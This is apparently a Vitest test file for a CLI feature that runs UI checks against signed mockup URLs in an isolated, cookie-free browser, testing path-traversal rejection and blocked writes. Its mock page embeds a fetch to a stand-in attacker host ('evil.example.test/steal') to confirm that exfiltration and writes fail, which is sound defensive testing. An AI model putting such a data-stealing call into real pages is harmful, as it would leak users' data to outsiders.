// TESTS FOR STEP B.4: `--mockup ID[@VERSION]` IN `check run` WITH ISOLATED ZERO-COOKIE BROWSER CONTEXT.

// -- DEP-MODULES -- //
import { createServer, type IncomingMessage, type Server } from 'node:http';
import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
// -- MODULES -- //
import { parseMockupRef } from './mockupTarget.js';
import { runsDir, scriptPath } from './paths.js';
import { runCheck, type RunOptions } from './run.js';
import { runCheckInSandbox } from './sandbox.js';
import { ensureBrowser } from './browser.js';
import { acquireBrowser } from './browserpool.js';

// -- CONSTANTS -- //

const ITEM = 'AFB-20261113-1008';

// -- HELPERS -- //

function startHttpServer(
	handler: (
		req: IncomingMessage,
		body: string
	) => { status: number; headers?: Record<string, string>; body: string }
): Promise<{ server: Server; origin: string }> {
	return new Promise((resolve) => {
		const server = createServer((req, res) => {
			let raw = '';
			req.setEncoding('utf8');
			req.on('data', (c) => (raw += c));
			req.on('end', () => {
				const out = handler(req, raw);
				res.writeHead(out.status, out.headers);
				res.end(out.body);
			});
		});
		server.listen(0, '127.0.0.1', () => {
			const addr = server.address() as { port: number };
			resolve({ server, origin: `http://127.0.0.1:${addr.port}` });
		});
	});
}

describe('parseMockupRef', () => {
	it('parses bare mockup ids and explicit @version suffixes', () => {
		expect(parseMockupRef('abc-123')).toEqual({ id: 'abc-123', raw: 'abc-123' });
		expect(parseMockupRef('550e8400-e29b-41d4-a716-446655440000@3')).toEqual({
			id: '550e8400-e29b-41d4-a716-446655440000',
			version: 3,
			raw: '550e8400-e29b-41d4-a716-446655440000@3'
		});
	});

	it('rejects empty ids, traversal characters and non-positive versions', () => {
		expect(() => parseMockupRef('')).toThrow();
		expect(() => parseMockupRef('../secret')).toThrow();
		expect(() => parseMockupRef('m1@0')).toThrow();
		expect(() => parseMockupRef('m1@two')).toThrow();
		expect(() => parseMockupRef('m1@')).toThrow();
	});
});

describe('check run --mockup ID[@VERSION] isolation', () => {
	let home = '';
	let repo = '';
	let beforeHome: string | undefined;
	let openServers: Server[] = [];

	beforeEach(() => {
		beforeHome = process.env.AFB_BRIDGE_HOME;
		home = mkdtempSync(join(tmpdir(), 'afb-mockup-home-'));
		process.env.AFB_BRIDGE_HOME = home;
		repo = mkdtempSync(join(tmpdir(), 'afb-mockup-repo-'));
		execFileSync('git', ['init', '-q'], { cwd: repo });
	});

	afterEach(async () => {
		for (const s of openServers) await new Promise<void>((r) => s.close(() => r()));
		openServers = [];
		if (beforeHome === undefined) delete process.env.AFB_BRIDGE_HOME;
		else process.env.AFB_BRIDGE_HOME = beforeHome;
		rmSync(home, { recursive: true, force: true });
		rmSync(repo, { recursive: true, force: true });
	});

	const writeScript = (key: string, text: string) => {
		const file = scriptPath('arbenger', ITEM, key);
		mkdirSync(dirname(file), { recursive: true });
		writeFileSync(file, text);
		return file;
	};

	const baseOptions = (
		fetchImpl: RunOptions['fetch'],
		extra: Partial<RunOptions> = {}
	): RunOptions => ({
		server: 'https://board.test',
		org: 'arbenger',
		item: ITEM,
		key: 'M1',
		dir: repo,
		runId: 'run-mockup-1',
		runnerToken: 'afx_test',
		personalToken: null,
		fetch: fetchImpl,
		log: () => undefined,
		...extra
	});

	it('refuses --local or --profile combined with --mockup before contacting the board', async () => {
		writeScript('M1', 'export default async () => {};');
		const calls: string[] = [];
		const fetchImpl: RunOptions['fetch'] = async (url) => {
			calls.push(String(url));
			return Response.json({});
		};

		const localOut = await runCheck(baseOptions(fetchImpl, { mode: 'local', mockup: 'm-1' }));
		expect(localOut.exitCode).toBe(2);
		expect(localOut.message).toMatch(/--local/);
		expect(calls).toHaveLength(0);

		const profOut = await runCheck(baseOptions(fetchImpl, { mockup: 'm-1@2', profile: 'admin' }));
		expect(profOut.exitCode).toBe(2);
		expect(profOut.message).toMatch(/--profile/);
		expect(calls).toHaveLength(0);
	});

	it('refuses storageState in sandboxed child when mockupMode is true', async () => {
		const script = writeScript('M2', 'export default async () => {};');
		const runDir = join(runsDir(), 'test-run-child');
		mkdirSync(runDir, { recursive: true });
		await ensureBrowser(() => undefined);
		const browser = await acquireBrowser({ hosts: ['127.0.0.1'], dedicated: true });
		try {
			const ran = await runCheckInSandbox({
				job: {
					baseUrl: 'http://127.0.0.1:9999/m/tok/file',
					ws: browser.wsEndpoint(),
					storageState: {
						cookies: [{ name: 'sid', value: 'secret', domain: '127.0.0.1', path: '/' }]
					},
					checkFile: script,
					runDir,
					viewport: { width: 800, height: 600 },
					extraHosts: [],
					needles: [],
					mockupMode: true
				},
				scriptsRoot: join(home, 'checks', 'scripts'),
				log: () => undefined
			});
			expect(ran.result).toBeNull();
			expect(ran.stderr).toMatch(/cannot accept saved sign-ins or storageState/i);
		} finally {
			await browser.release();
			rmSync(runDir, { recursive: true, force: true });
		}
	}, 60_000);

	it('mints versioned signed mockup URL and executes check in an isolated zero-cookie browser context', async () => {
		const seenHeaders: Record<string, string>[] = [];
		let writeAttempted = false;
		const boardCalls: { path: string; body: string }[] = [];

		const started = await startHttpServer((req, body) => {
			const url = new URL(req.url ?? '/', 'http://127.0.0.1');
			if (url.pathname === '/m/signed-tok/file') {
				seenHeaders.push({
					cookie: String(req.headers.cookie ?? ''),
					screen: url.searchParams.get('screen') ?? '',
					sig: url.searchParams.get('sig') ?? ''
				});
				if (req.method !== 'GET') {
					writeAttempted = true;
					return { status: 500, body: 'write should have been blocked' };
				}
				return {
					status: 200,
					headers: { 'content-type': 'text/html; charset=utf-8' },
					body: `<!doctype html><html><head><link rel="stylesheet" href="/m/signed-tok/kit.css"></head>
						<body>
							<div data-ref="hero" id="hero">Screen=${url.searchParams.get('screen') ?? 'default'}</div>
							<script>
								fetch('/api/write', { method: 'POST', body: 'x' }).catch(() => {});
								fetch('https://evil.example.test/steal').catch(() => {});
							</script>
						</body></html>`
				};
			}
			if (url.pathname === '/m/signed-tok/kit.css') {
				return {
					status: 200,
					headers: { 'content-type': 'text/css' },
					body: '[data-ref="hero"] { color: rgb(220, 38, 38); }'
				};
			}
			boardCalls.push({ path: url.pathname, body });
			if (url.pathname === '/api/v1/runner/claim') {
				return {
					status: 200,
					headers: { 'content-type': 'application/json' },
					body: JSON.stringify({
						job: {
							id: 'run-mockup-1',
							project: { id: 'p-1', key: 'AFB', name: 'AFB' },
							item: { id: 'i-1', ref: ITEM, title: 'Visual evidence' },
							check: { id: 'c-1', key: 'M3', title: 'Mockup check' },
							registration: 'ignored-reg'
						}
					})
				};
			}
			if (url.pathname === '/api/v1/runner/mockups/m-demo/url') {
				const parsed = JSON.parse(body || '{}') as { version?: number };
				return {
					status: 200,
					headers: { 'content-type': 'application/json' },
					body: JSON.stringify({
						url: `${started.origin}/m/signed-tok/file?sig=valid`,
						relativePath: '/m/signed-tok/file?sig=valid',
						mockupId: 'm-demo',
						projectId: 'p-1',
						version: parsed.version ?? 1,
						kind: 'html',
						expiresAt: new Date(Date.now() + 120_000).toISOString(),
						isolatedOrigin: true,
						devOnlySameHost: false,
						notice: null,
						isPublic: false
					})
				};
			}
			if (url.pathname.endsWith('/artifacts')) {
				return {
					status: 200,
					headers: { 'content-type': 'application/json' },
					body: JSON.stringify({ attachmentId: 'att-1' })
				};
			}
			return {
				status: 200,
				headers: { 'content-type': 'application/json' },
				body: JSON.stringify({ ok: true })
			};
		});
		openServers.push(started.server);

		writeScript(
			'M3',
			`// afb-profile: secret-profile
export default async ({ page, step, expect, baseUrl, sweep }) => {
	await step('Load mockup directly with baseUrl', async () => {
		expect(baseUrl).toContain('/m/signed-tok/file?sig=valid');
		await page.goto(baseUrl, { waitUntil: 'load' });
		const color = await page.evaluate(() => getComputedStyle(document.querySelector('[data-ref="hero"]')).color);
		expect(color).toBe('rgb(220, 38, 38)');
		const cookie = await page.evaluate(() => document.cookie);
		expect(cookie).toBe('');
	});
	await sweep({ screens: [{ name: 'Billing', path: '?screen=billing' }], widths: [390] });
};`
		);

		const out = await runCheck(
			baseOptions(fetch, {
				server: started.origin,
				key: 'M3',
				mockup: 'm-demo@2'
			})
		);
		expect(out, out.message).toMatchObject({ exitCode: 0 });
		expect(writeAttempted).toBe(false);
		expect(seenHeaders.length).toBeGreaterThanOrEqual(2);
		expect(seenHeaders.every((h) => h.cookie === '' && h.sig === 'valid')).toBe(true);
		expect(seenHeaders.some((h) => h.screen === 'billing')).toBe(true);

		const mintCall = boardCalls.find((c) => c.path === '/api/v1/runner/mockups/m-demo/url');
		expect(mintCall).toBeTruthy();
		expect(JSON.parse(mintCall!.body)).toEqual({ version: 2 });

		const finishCall = boardCalls.find((c) => c.path === '/api/v1/runner/runs/run-mockup-1/finish');
		expect(finishCall).toBeTruthy();
		const report = JSON.parse(finishCall!.body) as { result: string; url: string };
		expect(report.result).toBe('pass');
		expect(report.url).toBe(started.origin);
	}, 90_000);
});
